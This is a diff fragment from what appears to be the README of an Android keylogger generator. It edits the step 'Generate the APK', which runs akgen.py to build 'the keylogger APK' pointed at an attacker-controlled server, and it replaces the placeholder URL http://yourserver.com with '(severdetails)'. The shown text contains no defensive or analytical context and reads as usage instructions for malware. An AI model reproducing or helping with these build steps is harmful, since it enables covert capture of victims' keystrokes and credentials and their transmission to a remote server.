@@ -47,7 +47,7 @@ export PATH=$PATH:$ANDROID_HOME/tools/bin
 Step 1: Generate the APK
 Run the following command to generate the keylogger APK:
 ```bash
-python akgen.py -o akgen.apk -s http://yourserver.com
+python akgen.py -o akgen.apk -s (severdetails)
 ```
 `-o`: Output APK file name.
 
